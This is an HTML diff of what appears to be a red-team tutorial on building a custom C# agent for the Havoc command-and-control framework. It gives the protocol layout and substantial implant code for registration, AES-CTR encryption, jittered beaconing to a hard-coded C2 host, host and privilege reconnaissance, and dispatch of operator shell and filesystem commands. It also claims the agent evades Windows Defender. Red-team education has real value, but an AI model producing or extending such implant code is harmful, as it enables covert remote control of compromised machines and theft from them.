+            Writing a custom Havoc-compatible agent means implementing a specific wire protocol over HTTP, and nothing more. The teamserver does not care what language produces the binary, how the binary manages memory, or what evasion techniques it uses internally. No teamserver modification is needed and any HTTP POST arriving at the listener with the correct magic value is accepted and processed as a valid agent. The only thing that matters is that the bytes match the format it expects. The five implementation tasks below were identified by analysing the teamserver source at github.com/HavocFramework/Havoc, in the absence of any published specification, the source code is the only authoritative reference. In practice, this breaks down into five distinct implementation tasks.
+          </p>
+
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm">
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+              <p class="font-semibold text-indigo-400">1) Generate a Session Key and ID</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                At startup, generate a 32-byte AES session key, a 16-byte AES IV, and a 32-bit agent ID from a cryptographically secure source. In C# use <code class="text-amber-300">RNGCryptoServiceProvider</code>, never the standard <code class="text-amber-300">Random</code> class. The agent ID becomes the permanent session identifier on both sides.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+              <p class="font-semibold text-indigo-400">2) Synchronise the Magic Value</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                The magic value is a 4-byte big-endian constant the teamserver checks first and drops any packet that does not match. Stock Havoc uses <code class="text-amber-300">0xDEADBEEF</code>. If you are running a modified teamserver binary with a different value, update this constant to match. Mismatching it produces no useful error, so check it first whenever registration fails silently.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+              <p class="font-semibold text-indigo-400">3) Implement AES-256-CTR</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                Havoc uses AES-256 CTR mode for all payload encryption. The counter starts at the session IV and increments as a big-endian integer (last byte first, with carry). A critical detail, the stock teamserver uses the same fixed session IV for every task it encrypts/decrypt each task as <code class="text-amber-300 text-xs">AesCtr(encBytes, sessionKey, sessionIV)</code>. Results sent back to the server are also encrypted with the same fixed IV. This means every packet shares the same keystream, which is a known weakness detailed in the gaps section, but it is the behaviour you must match to interoperate with the stock binary.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+              <p class="font-semibold text-indigo-400">4) Build and Send the Registration Packet</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                Assemble each metadata field in the exact parser order: hostname, username, domain, and IP as 4-byte BE length then ASCII bytes; process path as 4-byte BE length then UTF-16 LE bytes; most integers as 4-byte BE; 64-bit fields such as base address as 8-byte BE. Encrypt the entire body. Prepend the outer header: SIZE(BE), MAGIC(BE), AGENT_ID(BE), CMD_INIT=99(BE), ZERO(BE), then the key and IV in plaintext. POST and check that the decrypted response echoes back your agent ID.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 sm:col-span-2">
+              <p class="font-semibold text-indigo-400">5) Write the Polling Loop and Command Dispatcher</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                After successful registration, enter the check-in loop. On each iteration send a POST, read the response, and loop until the bytes are exhausted, read CMD(4LE), REQ_ID(4LE), LENGTH(4LE), decrypt the task data, and dispatch to the handler. After the handler returns, assemble the result packet, SIZE(BE), MAGIC(BE), AGENT_ID(BE), CMD(BE plaintext), REQID(BE plaintext), then AES(OUTER_LEN, INNER_LEN, bytes), and POST it back. Sleep for the configured interval with optional jitter and repeat.
+              </p>
+            </div>
+          </div>
+
+          <h3 class="text-xl font-semibold text-teal-300">C# Registration Sketch</h3>
+          <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// Generate session credentials</span>
+<span class="text-teal-300">byte</span>[] key = <span class="text-teal-300">new byte</span>[32];
+<span class="text-teal-300">byte</span>[] iv  = <span class="text-teal-300">new byte</span>[16];
+<span class="text-teal-300">using var</span> rng = <span class="text-teal-300">new</span> RNGCryptoServiceProvider();
+rng.GetBytes(key); rng.GetBytes(iv);
+<span class="text-teal-300">uint</span> agentId = (uint)new Random().Next(0x100000, int.MaxValue);
+
+<span class="text-slate-500">// Encrypted metadata body — field order enforced by ParseDemonRegisterRequest</span>
+<span class="text-teal-300">var</span> body = <span class="text-teal-300">new</span> MemoryStream();
+WriteBEStr(body, hostname);    <span class="text-slate-500">// ASCII + BE length prefix</span>
+WriteBEStr(body, username);
+WriteBEStr(body, domain);
+WriteBEStr(body, internalIp);
+WriteBEWStr(body, processPath); <span class="text-slate-500">// UTF-16 LE + BE length prefix</span>
+WriteBE32(body, (uint)pid); WriteBE32(body, (uint)tid); WriteBE32(body, (uint)ppid);
+WriteBE32(body, osFlags); WriteBE32(body, elevated); WriteBE64(body, processFlags);
+WriteBE32(body, osMajor); WriteBE32(body, osMinor); WriteBE32(body, osProductType);
+WriteBE32(body, osPack); WriteBE32(body, osBuild); WriteBE32(body, arch);
+WriteBE32(body, sleepSecs); WriteBE32(body, jitterPct);
+WriteBE64(body, killDate); WriteBE32(body, workingHours);
+<span class="text-teal-300">byte</span>[] encBody = AesCtr(body.ToArray(), key, iv);
+
+<span class="text-slate-500">// Outer packet: [SIZE 4BE][MAGIC 4BE][AGENT_ID 4BE][CMD_INIT=99 4BE][ZERO 4BE][KEY 32][IV 16][encBody]</span>
+<span class="text-teal-300">var</span> pkt = <span class="text-teal-300">new</span> MemoryStream();
+WriteBE32(pkt, 0);             <span class="text-slate-500">// SIZE placeholder — backfilled below</span>
+WriteBE32(pkt, 0xDEADBEEF);   <span class="text-slate-500">// MAGIC — must match the value compiled into the teamserver binary</span>
+WriteBE32(pkt, agentId);
+WriteBE32(pkt, 99);            <span class="text-slate-500">// CMD_INIT</span>
+WriteBE32(pkt, 0);             <span class="text-slate-500">// ZERO padding</span>
+pkt.Write(key, 0, 32); pkt.Write(iv, 0, 16);
+pkt.Write(encBody, 0, encBody.Length);
+<span class="text-teal-300">byte</span>[] raw = pkt.ToArray();
+<span class="text-teal-300">uint</span> sz = (uint)(raw.Length - 4);
+raw[0]=(byte)(sz>>24); raw[1]=(byte)(sz>>16); raw[2]=(byte)(sz>>8); raw[3]=(byte)sz;
+<span class="text-teal-300">byte</span>[] resp = HttpPost(C2_URL, raw);</pre>
+          </div>
+        </section>
+      </div>
+    </div>
+    <br>
+
+    <!-- ══ 06 HOW THE CUSTOM AGENT WORKS ══════════════════════════════ -->
+    <div id="howworks" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-6 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">6: How the Custom Agent Works with Havoc</h2>
+
+          <p class="leading-relaxed">
+            This project ships a custom agent written in C# targeting .NET Framework 4.5+. It implements the full Havoc wire protocol and exposes the commands listed below to the operator through the Havoc client. As of the time of writing, the agent has been tested against Windows Defender and passes without triggering a detection and the evasion gaps noted in section 8 remain open improvement areas.
+          </p>
+
+          <h3 class="text-xl font-semibold text-teal-300">Supported Commands</h3>
+
+          <div class="rounded-2xl border border-emerald-500/30 bg-gray-950 shadow-xl">
+            <div class="border-b border-emerald-500/20 bg-gradient-to-r from-emerald-600/20 to-teal-600/10 p-5">
+              <h3 class="text-xl font-semibold text-emerald-200">Command Coverage</h3>
+            </div>
+            <div class="overflow-x-auto">
+              <table class="min-w-full text-sm">
+                <thead>
+                  <tr class="bg-gray-900/60 text-gray-400 text-xs uppercase tracking-wider">
+                    <th class="px-4 py-3 text-left">Operator Command</th>
+                    <th class="px-4 py-3 text-left">CMD ID</th>
+                    <th class="px-4 py-3 text-left">What the Agent Does</th>
+                    <th class="px-4 py-3 text-left">Implemented</th>
+                  </tr>
+                </thead>
+                <tbody class="divide-y divide-emerald-700/20 text-slate-200">
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-mono text-amber-300 text-xs">sleep &lt;s&gt;</td><td class="px-4 py-3 font-mono text-xs">11</td><td class="px-4 py-3">Updates the polling interval (value is in seconds) and jitter percentage on each cycle</td><td class="px-4 py-3 text-emerald-400">Yes</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-mono text-amber-300 text-xs">ps</td><td class="px-4 py-3 font-mono text-xs">12</td><td class="px-4 py-3">Enumerates all running processes via <code class="text-xs">Process.GetProcesses()</code>, returning PID, PPID, name, WOW64 status, and session</td><td class="px-4 py-3 text-emerald-400">Yes</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-mono text-amber-300 text-xs">ls / cd / mkdir / rm / cat / cp / mv / pwd</td><td class="px-4 py-3 font-mono text-xs">15</td><td class="px-4 py-3">Filesystem operations — 4-byte LE sub-command integer selects DIR, CD, MKDIR, REMOVE, CAT, CP, MV, PWD. Download (sub=2) and upload (sub=3) are intentional gaps.</td><td class="px-4 py-3 text-emerald-400">Yes</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-mono text-amber-300 text-xs">shell &lt;cmd&gt; / run / kill</td><td class="px-4 py-3 font-mono text-xs">0x1010</td><td class="px-4 py-3">Spawns processes, captures stdout and stderr with a 30-second watchdog, terminates hangers, returns real PIDs</td><td class="px-4 py-3 text-emerald-400">Yes</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-mono text-amber-300 text-xs">exit</td><td class="px-4 py-3 font-mono text-xs">92</td><td class="px-4 py-3">Terminates the agent process cleanly</td><td class="px-4 py-3 text-emerald-400">Yes</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <article class="rounded-xl bg-slate-800/40 p-6 ring-1 ring-slate-700/40">
+            <h3 class="text-xl font-semibold text-teal-300">The Shell Timeout Watchdog</h3>
+            <p class="mt-3 text-slate-300 leading-relaxed">
+              Before this fix, running a command like <code class="text-amber-300 bg-slate-900 px-1 rounded text-xs">ping -t 127.0.0.1</code> from the Havoc client would cause the agent to block forever on the pipe read, making the session appear dead. The fix uses two parallel reader threads to drain stdout and stderr simultaneously, which eliminates both the hang and a pre-existing pipe deadlock where a child writing enough bytes to fill the stderr buffer while the agent was reading stdout would cause both sides to hang indefinitely. A 30-second watchdog timer terminates the child process and unblocks the drain loop if the command does not complete in time.
+            </p>
+          </article>
+
+          <article class="rounded-xl bg-red-900/20 p-6 ring-1 ring-red-500/30">
+            <h3 class="text-xl font-semibold text-red-300">Lesson Learned: Wrong Assumption About AES Encryption</h3>
+            <p class="mt-3 text-slate-300 leading-relaxed">
+              During development the agent connected and registered successfully but every shell command returned no output. Logging the raw decrypted bytes revealed the cause, the first 8 bytes were garbage instead of the expected sub-command <code class="text-amber-300 bg-slate-900 px-1 rounded text-xs">04-00-00-00</code>. The C# agent had been written to strip a 16-byte per-task nonce from the front of each encrypted payload before decrypting, a reasonable assumption, but wrong. Reading <code class="text-amber-300 bg-slate-900 px-1 rounded text-xs">teamserver/pkg/agent/agent.go</code> directly confirmed it. The stock teamserver encrypts task payloads with the fixed session IV and emits no nonce. The fix was two lines: decrypt tasks as <code class="text-amber-300 bg-slate-900 px-1 rounded text-xs">AesCtr(enc, _key, _iv)</code> with the session IV, and encrypt results the same way. The broader lesson, "Read the teamserver source and verify your assumptions before debugging the agent. A wrong assumption about the encryption format produces garbage that looks identical to a wrong AES key."
+            </p>
+          </article>
+
+          <div class="rounded-xl bg-emerald-900/20 p-4 ring-1 ring-emerald-500/30 text-sm text-emerald-200">
+            <strong>Deployment note:</strong> The agent hard-codes the C2 address and port as compile-time constants. There is no malleable profile or dynamic configuration loaded at runtime. Changing the listener address requires recompiling. This is one of the intentional gaps, a red teamer building on this base should implement an encrypted config blob that decodes at startup.
+          </div>
+        </section>
+      </div>
+    </div>
+    <br>
+
+    <!-- ══ 07 CODE WALK-THROUGH ══════════════════════════════════════ -->
+    <div id="walkthrough" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-10 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">7: Code Walk-Through "Block by Block"</h2>
+
+          <p class="leading-relaxed">
+            This section walks through every block of <code class="text-amber-300 text-xs bg-slate-900 px-1 rounded">HavocAgent.cs</code>. Explaining what the C# code does, what the Havoc teamserver expects on the other end, and precisely how the two sides synchronise. Everything described under the "Teamserver side" labels was established by reading the official Havoc repository source. Read this alongside the source file; each sub-section maps directly to a named method or group of constants.
+          </p>
+
+          <!-- ── Configuration constants ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">1: Configuration Constants</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> The Havoc listener is configured in a <code class="text-amber-300 text-xs">profile.yaotl</code> file that sets the bind host, port, and HTTP path. The agent must mirror those values exactly and wrong host or URI causes the HTTP POST to 404 before the teamserver even sees the body.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// The only values you change before compiling</span>
+<span class="text-teal-300">const string</span> HOST  = <span class="text-amber-300">"CHANGE_ME"</span>;   <span class="text-slate-500">// C2 IP or hostname from your listener profile</span>
+<span class="text-teal-300">const int</span>    PORT  = 80;            <span class="text-slate-500">// C2 port from your listener profile</span>
+<span class="text-teal-300">const bool</span>   HTTPS = <span class="text-teal-300">false</span>;
+<span class="text-teal-300">const string</span> URI   = <span class="text-amber-300">"/"</span>;            <span class="text-slate-500">// must match the Http.Uri value in the profile</span>
+<span class="text-teal-300">const string</span> UA    = <span class="text-amber-300">"Mozilla/5.0 ..."</span>; <span class="text-slate-500">// sent in every HTTP POST</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              These constants are embedded directly into the compiled binary. There is no runtime config loaded from disk. The <code class="text-amber-300 text-xs">UA</code> string is sent as the <code class="text-amber-300 text-xs">User-Agent</code> header on every HTTP request. The teamserver does not validate the User-Agent, but a realistic value blends the traffic into normal browser noise on any network sensor that logs HTTP headers.
+            </p>
+          </div>
+
+          <!-- ── Protocol IDs ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">2: Protocol IDs and Magic Value</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> Every incoming packet is checked against the magic value in the first 8 bytes before any further parsing. The stock binary has <code class="text-amber-300 text-xs">0xDEADBEEF</code> compiled in. A mismatch causes the handler to drop the packet silently with no error, no log. The command IDs come from the same constants table that drives the teamserver's dispatcher.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-teal-300">const uint</span> DEMON_MAGIC   = 0xDEADBEEF;  <span class="text-slate-500">// stock teamserver — swap if using a modified binary</span>
+<span class="text-teal-300">const uint</span> CMD_INIT      = 99;   <span class="text-slate-500">// registration handshake</span>
+<span class="text-teal-300">const uint</span> CMD_GETJOB    = 1;    <span class="text-slate-500">// poll for queued tasks</span>
+<span class="text-teal-300">const uint</span> CMD_NOJOB     = 10;   <span class="text-slate-500">// server has nothing queued</span>
+<span class="text-teal-300">const uint</span> CMD_SLEEP     = 11;   <span class="text-slate-500">// update polling interval</span>
+<span class="text-teal-300">const uint</span> CMD_PROC_LIST = 12;   <span class="text-slate-500">// process enumeration</span>
+<span class="text-teal-300">const uint</span> CMD_FS        = 15;   <span class="text-slate-500">// filesystem operations (sub-command selects action)</span>
+<span class="text-teal-300">const uint</span> CMD_PROC      = 0x1010; <span class="text-slate-500">// process create / kill</span>
+<span class="text-teal-300">const uint</span> CMD_OUTPUT    = 90;   <span class="text-slate-500">// command output back to operator</span>
+<span class="text-teal-300">const uint</span> CMD_EXIT      = 92;   <span class="text-slate-500">// terminate agent process</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              Each filesystem (FS) and process (PROC) command uses a second-level sub-command integer inside the encrypted payload to select the specific action. This lets the teamserver share one top-level command ID for an entire category of operations while the agent branches on the sub-command byte after decryption.
+            </p>
+          </div>
+
+          <!-- ── Session state ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">3: Session State and Entry Point</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> When the teamserver receives a valid registration it stores the agent ID, AES key, AES IV, and all metadata in SQLite. Every subsequent packet from the same agent ID is decrypted using those stored key and IV values. The three session variables — <code class="text-amber-300 text-xs">_id</code>, <code class="text-amber-300 text-xs">_key</code>, <code class="text-amber-300 text-xs">_iv</code> — are the cryptographic identity of the session on both sides.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// Generated once at startup — never changes for the lifetime of this session</span>
+<span class="text-teal-300">static uint</span>   _id;          <span class="text-slate-500">// 32-bit random agent identity</span>
+<span class="text-teal-300">static byte</span>[] _key;         <span class="text-slate-500">// 32-byte AES-256 session key</span>
+<span class="text-teal-300">static byte</span>[] _iv;          <span class="text-slate-500">// 16-byte AES CTR session IV</span>
+<span class="text-teal-300">static int</span>    _sleepMs = 5000; <span class="text-slate-500">// operator-updatable at runtime via CMD_SLEEP</span>
+<span class="text-teal-300">static int</span>    _jitter  = 10;
+
+<span class="text-slate-500">// Start() generates them from a cryptographically secure source</span>
+_key = <span class="text-teal-300">new byte</span>[32]; _iv = <span class="text-teal-300">new byte</span>[16];
+<span class="text-teal-300">using</span> (<span class="text-teal-300">var</span> rng = <span class="text-teal-300">new</span> RNGCryptoServiceProvider()) { rng.GetBytes(_key); rng.GetBytes(_iv); }
+<span class="text-teal-300">var</span> rnd = <span class="text-teal-300">new</span> Random();
+_id = (uint)rnd.Next(0x100000, int.MaxValue);</pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              <code class="text-amber-300 text-xs">Start()</code> also disables TLS certificate validation so the agent connects to a self-signed cert on the teamserver without throwing. It then retries <code class="text-amber-300 text-xs">Register()</code> every 15 seconds until the handshake succeeds, then enters the infinite check-in loop. The jitter each cycle is computed as <code class="text-amber-300 text-xs">(_sleepMs × _jitter%) + random(0, result)</code>, producing irregular beacon intervals that are harder to identify from network traffic timing alone.
+            </p>
+          </div>
+
+          <!-- ── Registration ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">4: Registration: BuildInitPayload() + BuildInitPacket()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> <code class="text-amber-300 text-xs">ParseDemonRegisterRequest</code> in <code class="text-amber-300 text-xs">demons.go</code> reads each field in exact order using its own length-prefixed reader. One field out of sequence corrupts all subsequent reads, the parser does not validate field names, only byte counts. After parsing, the teamserver stores the session in SQLite and broadcasts a WebSocket event to all connected operator clients, causing the new session row to appear instantly in their tables.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// BuildInitPayload() — order is enforced by the teamserver parser</span>
+WriteBE32(ms, _id);
+WriteBEStr(ms, hostname);   <span class="text-slate-500">// ASCII + 4-byte BE length prefix</span>
+WriteBEStr(ms, username);
+WriteBEStr(ms, domain);
+WriteBEStr(ms, ip);
+WriteBEWStr(ms, proc);      <span class="text-slate-500">// UTF-16 LE bytes + 4-byte BE length prefix (process path)</span>
+WriteBE32(ms, (uint)pid);  WriteBE32(ms, (uint)tid);  WriteBE32(ms, (uint)ppid);
+WriteBE32(ms, arch);        <span class="text-slate-500">// process arch: IntPtr.Size == 8 ? 2 : 1  (runtime)</span>
+WriteBE32(ms, elev);        <span class="text-slate-500">// elevated: WindowsPrincipal.IsInRole(Admin)  (runtime)</span>
+WriteBE64(ms, baseAddr);    <span class="text-slate-500">// base address: MainModule.BaseAddress  (runtime, 8 bytes)</span>
+WriteBE32(ms, (uint)osv.Major);  <span class="text-slate-500">// OS major  (runtime)</span>
+WriteBE32(ms, (uint)osv.Minor);  <span class="text-slate-500">// OS minor  (runtime)</span>
+WriteBE32(ms, 1);           <span class="text-slate-500">// product type (hardcoded)</span>
+WriteBE32(ms, 0);           <span class="text-slate-500">// OS pack (hardcoded)</span>
+WriteBE32(ms, (uint)osv.Build);  <span class="text-slate-500">// build: Environment.OSVersion  (runtime)</span>
+WriteBE32(ms, 9);           <span class="text-slate-500">// processor arch: PROCESSOR_ARCHITECTURE_AMD64 (hardcoded)</span>
+WriteBE32(ms, (uint)(_sleepMs/1000));
+WriteBE32(ms, (uint)_jitter);
+WriteBE64(ms, 0UL);         <span class="text-slate-500">// kill date</span>
+WriteBE32(ms, 0);           <span class="text-slate-500">// working hours</span>
+
+<span class="text-slate-500">// BuildInitPacket() wraps it — key and IV go in plaintext before the encrypted body</span>
+<span class="text-slate-500">// [SIZE 4BE][MAGIC 4BE][_id 4BE][CMD_INIT=99 4BE][ZERO 4BE][KEY 32][IV 16][AES(body)]</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              The process path field is the only string that uses UTF-16 LE bytes instead of ASCII, this matches what the teamserver displays in the operator client's Process column. Most integers are 4-byte big-endian; the base address field is 8-byte big-endian. The key and IV travel in plaintext so the teamserver can bootstrap decryption of the encrypted body. <code class="text-amber-300 text-xs">Register()</code> verifies success by checking that the server's response, when decrypted with <code class="text-amber-300 text-xs">AesCtr(resp, _key, _iv)</code>, contains the same agent ID that was sent, confirming the server accepted the registration packet and stored the session correctly.
+            </p>
+          </div>
+
+          <!-- ── AES-256-CTR ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">5: AES-256-CTR: AesCtr()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> <code class="text-amber-300 text-xs">XCryptBytesAES256</code> in <code class="text-amber-300 text-xs">teamserver/pkg/common/crypt/aes.go</code> implements the same algorithm, AES-ECB per block, XOR with data, counter incremented big-endian from the last byte. Critically, the teamserver calls it as <code class="text-amber-300 text-xs">XCryptBytesAES256(payload, sessionKey, sessionIV)</code> with the <em>fixed session IV</em> for every single task. There is no per-task nonce in the stock binary.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// Counter resets to _iv on EVERY call — intentional to match teamserver behaviour</span>
+<span class="text-teal-300">static byte</span>[] AesCtr(<span class="text-teal-300">byte</span>[] data, <span class="text-teal-300">byte</span>[] key, <span class="text-teal-300">byte</span>[] iv)
+{
+    <span class="text-teal-300">byte</span>[] result  = <span class="text-teal-300">new byte</span>[data.Length];
+    <span class="text-teal-300">byte</span>[] counter = (byte[])iv.Clone();   <span class="text-slate-500">// starts at session IV every time</span>
+    <span class="text-teal-300">int</span> off = 0;
+    <span class="text-teal-300">while</span> (off &lt; data.Length)
+    {
+        <span class="text-teal-500">// Encrypt the counter with AES-ECB to produce a keystream block</span>
+        <span class="text-teal-300">byte</span>[] ks;
+        <span class="text-teal-300">using</span> (<span class="text-teal-300">var</span> aes = Aes.Create())
+        { aes.Mode = CipherMode.ECB; aes.Key = key;
+          ks = aes.CreateEncryptor().TransformFinalBlock(counter, 0, 16); }
+        <span class="text-teal-300">int</span> n = Math.Min(16, data.Length - off);
+        <span class="text-teal-300">for</span> (<span class="text-teal-300">int</span> i = 0; i &lt; n; i++) result[off+i] = (byte)(data[off+i] ^ ks[i]);
+        off += n;
+        <span class="text-slate-500">// Increment counter big-endian (last byte first, with carry)</span>
+        <span class="text-teal-300">for</span> (<span class="text-teal-300">int</span> i = counter.Length-1; i &gt;= 0; i--)
+            <span class="text-teal-300">if</span> (++counter[i] != 0) <span class="text-teal-300">break</span>;
+    }
+    <span class="text-teal-300">return</span> result;
+}</pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              The counter increment, last byte first with carry, matches Go's <code class="text-amber-300 text-xs">incrementCounter</code> in the teamserver exactly. The most important constraint is that the counter <em>must reset to the session IV on every call</em> to match what the teamserver does. This is cryptographically weak (every packet reuses the same keystream, which is a known many-time pad vulnerability covered in the gaps section), but it is what the stock binary implements. Any deviation produces garbage decryption on one side or the other.
+            </p>
+          </div>
+
+          <!-- ── Check-in ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">6: Check-In: CheckIn() + BuildGetJobPacket()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> <code class="text-amber-300 text-xs">BuildPayloadMessage</code> in <code class="text-amber-300 text-xs">agent.go</code> dequeues pending tasks and packs each one as <code class="text-amber-300 text-xs">[CMD 4LE][REQID 4LE][LEN 4LE][AES-CTR(data, key, fixedIV)]</code>. All tasks are concatenated into one response body with no count prefix, the agent reads until bytes are exhausted. If the queue is empty the server sends a single CMD_NOJOB(10) record with LEN=0.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// Get-job packet: exactly 20 bytes</span>
+<span class="text-slate-500">// [16 4BE][MAGIC 4BE][_id 4BE][CMD_GETJOB=1 4BE][ZERO 4BE]</span>
+
+<span class="text-slate-500">// CheckIn() reads the response as a stream of task records:</span>
+<span class="text-teal-300">while</span> (off + 12 &lt;= resp.Length)
+{
+    uint cmd   = ReadLE32(resp, off); off += 4;   <span class="text-slate-500">// little-endian from server</span>
+    uint reqId = ReadLE32(resp, off); off += 4;
+    uint len   = ReadLE32(resp, off); off += 4;
+    <span class="text-teal-300">byte</span>[] enc = <span class="text-teal-300">new byte</span>[len];
+    Array.Copy(resp, off, enc, 0, (int)len); off += (int)len;
+    <span class="text-teal-300">if</span> (cmd == CMD_NOJOB) <span class="text-teal-300">continue</span>;
+    <span class="text-slate-500">// Decrypt with fixed session IV — stock binary sends no per-task nonce</span>
+    <span class="text-teal-300">byte</span>[] data = AesCtr(enc, _key, _iv);
+    DispatchTask(cmd, reqId, data);
+}</pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              The 16 in the first field of the get-job packet is the SIZE value, it counts the bytes after itself (4 fields × 4 bytes = 16). The teamserver identifies this as a check-in rather than a registration by the command ID (CMD_GETJOB=1 vs CMD_INIT=99). All fields from the server to the agent are little-endian; all fields from the agent to the server are big-endian. This asymmetry reflects Go's internal packer, which uses <code class="text-amber-300 text-xs">binary.LittleEndian</code> when writing tasks and expects <code class="text-amber-300 text-xs">binary.BigEndian</code> when reading agent results.
+            </p>
+          </div>
+
+          <!-- ── Task dispatch ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">7: Task Dispatch: DispatchTask()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> Each operator action in the Havoc client translates to a specific command ID. The client serialises the task, the teamserver queues it keyed by agent ID and command ID, and delivers it on the next check-in. The agent's switch statement mirrors the server's command table exactly, any unhandled CMD is silently ignored, producing no response and no error visible to the operator.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-teal-300">switch</span> (cmd)
+{
+    <span class="text-teal-300">case</span> CMD_SLEEP:
+        <span class="text-slate-500">// Task data: [seconds 4LE][jitter% 4LE] — handled inline, no result packet needed</span>
+        <span class="text-teal-300">if</span> (data.Length >= 4) _sleepMs = (int)ReadLE32(data, 0) * 1000;
+        <span class="text-teal-300">if</span> (data.Length >= 8) _jitter  = (int)ReadLE32(data, 4);
+        <span class="text-teal-300">break</span>;
+
+    <span class="text-teal-300">case</span> CMD_EXIT:
+        Environment.Exit(0);  <span class="text-slate-500">// immediate termination, no result</span>
+        <span class="text-teal-300">break</span>;
+
+    <span class="text-teal-300">case</span> CMD_FS:       DispatchFs(reqId, data);       <span class="text-teal-300">break</span>;
+    <span class="text-teal-300">case</span> CMD_PROC:     DispatchProc(reqId, data);     <span class="text-teal-300">break</span>;
+    <span class="text-teal-300">case</span> CMD_PROC_LIST: DispatchProcList(reqId, data); <span class="text-teal-300">break</span>;
+    <span class="text-slate-500">// Any other CMD falls through silently — add a case to implement it</span>
+}</pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              CMD_SLEEP and CMD_EXIT are handled inline because they need no result packet, the teamserver knows the sleep interval was accepted because the agent continues beaconing at the new rate, and CMD_EXIT never returns. All other commands delegate to a dedicated handler that does the work, then sends one or more result packets before returning.
+            </p>
+          </div>
+
+          <!-- ── FS operations ── -->
+          <div class="space-y-4">
